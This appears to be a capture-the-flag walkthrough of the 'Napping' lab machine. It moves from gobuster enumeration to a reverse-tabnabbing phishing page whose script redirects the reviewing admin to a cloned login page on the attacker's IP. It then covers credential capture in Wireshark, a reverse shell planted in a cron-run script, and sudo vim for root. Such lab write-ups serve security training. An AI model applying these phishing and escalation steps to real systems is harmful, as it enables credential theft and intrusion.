---

title: "Napping"

---

<center>
<strong>1. 🔍 Enumeration Part + Directory Bruteforcing</strong><br> 
<strong>2. ☠️ Exploitation Part</strong><br>
<strong>3. 🔓 Privilege Escalation Part</strong>
</center>

---

<h2><span style="color:red">1. 🔍 Enumeration Part + Directory Bruteforcing</span></h2><br>
We start with an Nmap scan:
<center>
<img src="./images/napping/nmap_napping.png"> 
</center><br>

Next, we perform directory bruteforcing using Gobuster:<br>
```bash
gobuster dir -u http://10.10.136.217/ -w=/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php
```
<center>
<img src="./images/napping/gobuster_napping.png">
</center><br>

The scan reveals an /admin directory. Let's explore it further:<br>
```bash
gobuster dir -u http://10.10.136.217/admin/ -w=/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php
```

<center>
<img src="./images/napping/gobuster_admin_napping.png"> 
</center><br>

Cheсking the main page:<br>
<center>
<img src="./images/napping/mainpage_napping.png">
</center>

We create a new account:<br>
<center>
<img src="./images/napping/sign_up_napping.png">
</center><br>

Checking the admin portal at /admin/login.php:<br>
<center>
<img src="./images/napping/admin_login_napping.png">
</center><br>

After registering as 'hacker', we see the text that says "Please submit your link so that we can get started.
All links will be reviewed by our admin who also built this site!"<br>
<center>
<img src="./images/napping/loggedin_napping.png">
</center>
<br>

By cloning the /admin/login.php page and creating a phishing HTML page with credential capture functionality, we can attempt to trick the admin into entering their credentials when they review our submitted link.<br>

<h2><span style="color:red"><strong>2. ☠️ Exploitation Part</strong></span></h2><br>

We download the /admin/login.php page:<br>
<center>
<img src="./images/napping/wget_login_php_napping.png">
</center><br>

Create test.html with redirection script:<br>
```bash
<!DOCTYPE html>
<html>
   <body>
      <script>
         window.opener.location='http://10.11.147.142:8000/login.php';
      </script>
   </body>
</html>
```
NOTE: Replace IP with your attacker machine IP and store both (login.php and test.html) files at the same directory.<br>

From the files directory we run Python servers on port 80 and 8000.<br>
<center>
<img src="./images/napping/python3_napping.png">
</center>
<br>

We start Wireshark to capture the phishing process:<br>
<center>
<img src="./images/napping/wireshark_start_napping.png">
</center>
NOTE: start capture traffic before sending a link to the target, and by your openvpn interface (I have tun0).
<br>

We send the phishing link and monitor WIRESHARK:<br>
```bash
http://your.ip:80/test.html
```
<br>
<center>
<img src="./images/napping/submit_napping.png">
</center><br>

Analyze TCP traffic in Wireshark to find captured credentials:<br>
<center>
<img src="./images/napping/creds_wireshark_napping.png">
</center><br>
NOTE: Password is URL encoded. Decoding it you've got C@ughtm3napping123

<br>
Use captured credentials to SSH into the system:<br>
<center>
<img src="./images/napping/ssh_login_daniel_napping.png">
</center><br>

Initial Access Obtained:<br>
<center>
<img src="./images/napping/query_py_napping.png">
</center><br>

<h2><span style="color:red">3. 🔓 Privilege Escalation Part</span></h2><br>

After some time of investigation we can find Adrian user and a file query.py,<br>
this script runs by it's user every 1 minute.<br>
Also we can read and write it, lets use it to get an Adrian's shell.<br>
<center>
<img src="./images/napping/revshesll_napping.png">
</center><br>
NOTE: your IP address will be different.<br>

Start netcat listener and wait for script execution:<br>
<center>
<img src="./images/napping/adrian_napping.png">
</center><br>
Direct command sudo -l shows us we can run vim as a sudo user.<br>
Let's get root!!!<br>
<center>
Checking GTFObins<br>
<img src="./images/napping/gtfo_napping.png">
</center><br>

Execute Vim with sudo to gain root shell:<br>
<center>
<img src="./images/napping/privesc_root_napping.png">
</center><br>
We are root!!!
